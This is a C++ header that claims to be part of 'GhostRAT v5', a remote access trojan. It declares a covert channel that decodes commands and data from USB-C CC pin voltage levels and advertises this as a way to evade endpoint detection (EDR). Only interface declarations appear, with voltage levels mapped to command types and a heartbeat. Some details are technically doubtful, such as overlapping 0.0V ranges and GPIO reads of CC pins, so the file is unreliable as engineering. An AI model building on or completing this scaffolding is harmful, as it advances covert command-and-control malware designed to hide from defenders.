/**
 * GhostRAT v5 "Chameleon" — USB-C CC Pin Voltage Decoder
 * 
 * Decodes binary data from USB-C CC1/CC2 pin voltage levels
 * Cross-platform (Windows + Linux)
 * 
 * EDR Blind Spot: EDRs don't monitor USB-C CC pin voltage levels
 */

#pragma once

#include <cstdint>
#include <vector>
#include <string>

namespace GhostRATv5 {

// USB-C CC pin voltage levels (standard)
enum class CCVoltage : uint8_t {
    OFF       = 0x00,  // 0.0V (no connection)
    LOW       = 0x01,  // 0.0V - 0.6V (command type 0)
    MID       = 0x02,  // 1.0V - 1.5V (command type 1)
    HIGH      = 0x03,  // 2.0V - 2.5V (command type 2)
    FULL      = 0x04,  // 3.3V (heartbeat)
    INVALID   = 0xFF,  // Invalid voltage level
};

// USB-C CC pin configuration
struct CCConfig {
    uint8_t  cc1_pin;    // CC1 GPIO pin
    uint8_t  cc2_pin;    // CC2 GPIO pin
    uint32_t sample_rate_hz; // Sampling rate (Hz)
    uint32_t debounce_ms;   // Debounce time (ms)
    bool     use_cc1;       // Use CC1 pin
    bool     use_cc2;       // Use CC2 pin
};

class CCPinDecoder {
public:
    CCPinDecoder();
    ~CCPinDecoder();

    // Initialize CC pin decoder with config
    bool init(const CCConfig& config);

    // Shutdown CC pin decoder
    void shutdown();

    // Read current CC pin voltage level
    CCVoltage read_cc_voltage();

    // Decode binary data from CC pin voltage levels
    std::vector<uint8_t> decode_cc_data(uint32_t timeout_ms = 1000);

    // Encode binary data to CC pin voltage levels
    std::vector<uint8_t> encode_cc_data(const std::vector<uint8_t>& data);

    // Get the last decoded command
    uint8_t get_last_command() const;

    // Get the last decoded data
    std::vector<uint8_t> get_last_data() const;

private:
    CCConfig config_;
    CCVoltage last_voltage_;
    uint8_t last_command_;
    std::vector<uint8_t> last_data_;
    bool initialized_;
    
    // Platform-specific GPIO read
    uint32_t read_gpio_platform(uint8_t pin);
    
    // Convert GPIO reading to voltage level
    CCVoltage gpio_to_voltage(uint32_t gpio_value);
    
    // Voltage to binary bit
    uint8_t voltage_to_bit(CCVoltage voltage);
    
    // Bit to voltage
    CCVoltage bit_to_voltage(uint8_t bit);
};

} // namespace GhostRATv5
